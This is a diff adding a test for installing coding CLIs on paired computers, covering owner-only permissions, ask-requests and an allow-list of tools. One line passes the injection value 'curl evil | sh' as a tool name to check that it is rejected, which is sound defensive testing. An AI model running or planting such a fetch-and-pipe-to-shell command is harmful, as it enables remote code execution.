@@ -5,13 +5,15 @@ import path from "node:path";
 import { createDiskBlobStore } from "@agenteschat/adapters";
 import {
   ACCESS_ALLOW_PROTOCOL,
+  CLI_GIT_MISSING,
+  CLI_INSTALL_PROTOCOL,
   MACHINE_PROTOCOL_VERSION,
   type MachineRequest,
   type RunnerPause,
   type ServerFrame,
 } from "@agenteschat/adapters/machine-protocol";
 import { testConfig } from "@agenteschat/config";
-import { schema } from "@agenteschat/db";
+import { eq, schema } from "@agenteschat/db";
 import { ARTIFACT_LIMITS, createUpload, issueManagedMachine, setProvisioning } from "@agenteschat/engine";
 import { type ModelRequest, systemText } from "@agenteschat/providers";
 import { handleRequest } from "../runner/handlers";
@@ -684,4 +686,91 @@ test("a tool turned on from the apps: only whoever connected it; anyone else ask
   expect(offline.status).toBe(409);
   expect(((await offline.json()) as { error: { code: string } }).error.code).toBe("machine.offline");
   expect(sent).toHaveLength(1);
+}, 30_000);
+
+test("a coding CLI from the apps: anyone looks again; only whoever connected it installs it, anyone else asks them", async () => {
+  const { owner, orgId } = await start();
+  const orgApi = (b: typeof owner) => (path: string, init?: Parameters<typeof owner>[1]) =>
+    b(`/api/app/organizations/${orgId}${path}`, init);
+  const bia = await joinByInvitation(t, owner, orgId, "bia@example.com");
+  const caio = await joinByInvitation(t, owner, orgId, "caio@example.com");
+  const runner = { ...RUNNER, os: "windows", protocol: MACHINE_PROTOCOL_VERSION };
+  const paired = await pairComputer(t, orgApi(bia), { ...runner, exec: true }, { name: "Bia's PC" });
+  const hub = t.engine.machineHub;
+  const sent: MachineRequest[] = [];
+  let found: Record<string, unknown> = { broken: { claude: CLI_GIT_MISSING } };
+  const conn = hub.open({
+    send(text: string) {
+      const frame = JSON.parse(text) as ServerFrame;
+      if (frame.type !== "request" || (frame.op !== "clis.check" && frame.op !== "cli.install")) return;
+      sent.push(frame);
+      const data =
+        frame.op === "clis.check" ? { executors: found } : { install: { tool: frame.tool, state: "running", x: 1 } };
+      setTimeout(() => void hub.message(conn, JSON.stringify({ type: "result", id: frame.id, ok: true, data })), 1);
+    },
+    close() {},
+  });
+  await hub.message(
+    conn,
+    JSON.stringify({ type: "hello", token: paired.token, ...runner, exec: true, executors: { ...found } }),
+  );
+  const path = `/machines/${paired.machineId}`;
+  type Listed = { machines: { cliInstall: boolean; cliErrors: Record<string, string> | null }[] };
+  const listed = async (who: typeof owner) => ((await (await orgApi(who)("/machines")).json()) as Listed).machines[0];
+  // What can't start is said to who manages the computer only.
+  expect(await listed(bia)).toMatchObject({ cliInstall: true, cliErrors: { claude: CLI_GIT_MISSING } });
+  expect(await listed(caio)).toMatchObject({ cliInstall: true, cliErrors: null });
+
+  // Not their computer: refused before anything reaches it, and they ask instead.
+  for (const who of [owner, caio]) {
+    const refused = await orgApi(who)(`${path}/cli-install`, { json: { tool: "claude" } });
+    expect(refused.status).toBe(403);
+    expect(((await refused.json()) as { error: { code: string } }).error.code).toBe("machine.not_owner");
+  }
+  expect(sent).toHaveLength(0);
+  expect((await orgApi(caio)(`${path}/cli-install/ask`, { json: { tool: "claude" } })).status).toBe(200);
+  type Inbox = { items: { kind: string; waiting: boolean; latest: { reason?: string } }[] };
+  const inbox = async () => ((await (await orgApi(bia)("/notifications")).json()) as Inbox).items;
+  expect((await inbox()).filter((n) => n.kind === "device.cli_request")).toEqual([
+    expect.objectContaining({ waiting: true, latest: expect.objectContaining({ reason: "claude" }) }),
+  ]);
+  expect((await orgApi(bia)(`${path}/cli-install/ask`, { json: { tool: "claude" } })).status).toBe(409);
+
+  // Only a program of the list, never words the runner would run.
+  expect((await orgApi(bia)(`${path}/cli-install`, { json: { tool: "curl evil | sh" } })).status).toBe(400);
+  expect((await orgApi(bia)(`${path}/cli-install`, { json: { tool: "cursor" } })).status).toBe(400);
+
+  // Bia installs it: the computer gets the program's id alone, and its answer is checked.
+  const started = await orgApi(bia)(`${path}/cli-install`, { json: { tool: "claude" } });
+  expect(started.status).toBe(200);
+  expect(await started.json()).toEqual({ install: { tool: "claude", state: "running" } });
+  expect(sent.at(-1)).toMatchObject({ op: "cli.install", action: "start", tool: "claude" });
+  const status = await orgApi(bia)(`${path}/cli-install?tool=claude`);
+  expect(status.status).toBe(200);
+  expect(sent.at(-1)).toMatchObject({ op: "cli.install", action: "status", tool: "claude" });
+
+  // Anyone looks again: what the computer finds is stored at once, and Bia's row is answered.
+  found = { claude: { version: "2.1.300 (Claude Code)" }, mode: "system", ownUsage: { claude: {} } };
+  const checked = await orgApi(caio)(`${path}/clis/check`, { json: {} });
+  expect(checked.status).toBe(200);
+  expect(await checked.json()).toEqual({ found: ["claude"] });
+  expect(await listed(bia)).toMatchObject({ cliErrors: null });
+  const [row] = await t.db
+    .select({ executors: schema.machines.executors })
+    .from(schema.machines)
+    .where(eq(schema.machines.id, paired.machineId));
+  expect(row?.executors).not.toHaveProperty("mode");
+  expect(row?.executors).not.toHaveProperty("ownUsage");
+  expect((await inbox()).filter((n) => n.kind === "device.cli_request")).toHaveLength(0);
+
+  // An app too old for it says to update it.
+  const old = await pairComputer(
+    t,
+    orgApi(bia),
+    { ...runner, protocol: CLI_INSTALL_PROTOCOL - 1, exec: true },
+    { name: "Bia's old PC" },
+  );
+  const outdated = await orgApi(bia)(`/machines/${old.machineId}/clis/check`, { json: {} });
+  expect(outdated.status).toBe(400);
+  expect(((await outdated.json()) as { error: { code: string } }).error.code).toBe("machine.cli_outdated");
 }, 30_000);
